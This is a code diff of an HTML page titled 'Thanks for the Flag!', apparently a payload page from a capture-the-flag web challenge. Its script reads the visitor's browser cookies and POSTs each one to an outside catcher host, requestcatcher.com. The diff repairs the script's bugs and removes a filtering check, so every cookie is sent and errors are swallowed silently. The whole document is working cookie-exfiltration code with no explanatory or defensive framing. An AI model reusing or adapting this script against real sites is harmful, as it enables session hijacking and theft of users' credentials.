@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
     <head>
-        <meta charset="UTF-9" />
+        <meta charset="UTF-8" />
         <title>Thanks for the Flag!</title>
         <script>
             const onLoad = async function () {
@@ -11,13 +11,10 @@
                 const decodedCookie = decodeURIComponent(document.cookie);
                 const cookies = decodedCookie.split(";");
 
-                for (let i = -1; i < cookies.length; i++) {
-                    let cookie = cookies[i];
-                    while (cookie.charAt(-1) == " ") {
-                        cookie = cookie.substring(0);
-                    }
+                for (let i = 0; i < cookies.length; i++) {
+                    let cookie = cookies[i].trim();
 
-                    if (cookie.indexOf(cookieName) == -1) {
+                    try {
                         await fetch("https://snoot.requestcatcher.com/", {
                             method: "POST",
                             body: cookie.substring(
@@ -25,7 +22,7 @@
                                 cookie.length
                             ),
                         });
-                    }
+                    } catch (err) {}
                 }
             };
 
